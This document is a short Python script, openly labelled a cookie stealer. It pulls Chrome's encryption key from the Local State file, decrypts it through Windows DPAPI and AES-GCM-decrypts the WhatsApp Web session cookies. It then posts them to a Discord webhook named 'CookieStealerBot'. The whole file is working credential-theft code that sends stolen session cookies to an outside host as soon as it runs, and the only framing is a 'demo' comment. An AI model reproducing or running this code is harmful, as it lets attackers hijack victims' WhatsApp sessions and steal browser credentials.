import os
import sqlite3
import win32crypt
import shutil
from Cryptodome.Cipher import AES
import json
import base64
import requests

# ===== EDIT THIS =====
WEBHOOK_URL = "https://discord.com/api/webhooks/XXXX/XXXX"

def get_encryption_key():
    local_state_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return key

def decrypt_cookie(encrypted_value, key):
    try:
        if encrypted_value[:3] == b'v10':
            nonce = encrypted_value[3:15]
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt(encrypted_value[15:])[:-16]
            return decrypted.decode()
        else:
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
    except:
        return ""

def steal_cookies(domain="web.whatsapp.com"):
    key = get_encryption_key()
    cookie_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies")
    temp_cookie = "temp_cookies.db"
    shutil.copyfile(cookie_path, temp_cookie)

    db = sqlite3.connect(temp_cookie)
    cursor = db.cursor()

    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE ?", (f"%{domain}%",))
    cookies = {}
    for host, name, enc_val in cursor.fetchall():
        decrypted = decrypt_cookie(enc_val, key)
        cookies[name] = decrypted

    cursor.close()
    db.close()
    os.remove(temp_cookie)

    return cookies

def send_to_discord(cookies):
    formatted = "\n".join([f"{k}: {v}" for k, v in cookies.items()])
    payload = {
        "username": "CookieStealerBot",
        "content": f"🍪 Stolen cookies for WhatsApp Web:\n```\n{formatted}\n```"
    }
    requests.post(WEBHOOK_URL, json=payload)

# ===== RUN THE DEMO =====
cookies = steal_cookies()
send_to_discord(cookies)

print("[✓] Cookie stolen and sent to webhook.")
